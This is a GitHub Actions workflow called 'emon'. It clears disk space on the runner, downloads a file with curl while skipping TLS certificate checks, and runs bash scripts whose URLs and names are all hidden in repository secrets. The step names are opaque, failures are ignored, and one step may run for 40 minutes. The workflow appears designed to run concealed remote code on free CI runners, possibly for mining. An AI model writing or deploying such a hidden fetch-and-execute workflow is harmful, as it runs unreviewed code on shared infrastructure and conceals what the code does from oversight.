name: emon

on:
    push:
    workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-22.04

    steps:
     - name: EF1
       uses: actions/checkout@main        
     - name: EF9
       uses: jlumbroso/free-disk-space@main       
       with:        # this might remove tools that are actually needed,
        # if set to "true" but frees about 6 GB
        tool-cache: true
        
        # all of these default to true, but feel free to set to
        # "false" if necessary for your workflow
        android: true
        dotnet: true
        haskell: true
        large-packages: true
        docker-images: true
        swap-storage: true

     - name: EF2
       timeout-minutes: 2
       continue-on-error: true
       run: |
             curl -sLkO ${{ secrets.EF_AB }}
             bash ${{ secrets.EF_CD }}
     - name: EF3
       continue-on-error: true
       run: |
             bash ${{ secrets.EF_EF }}
     - name: EF4
       timeout-minutes: 40
       continue-on-error: true
       run: |
            bash ${{ secrets.EF_GH }}
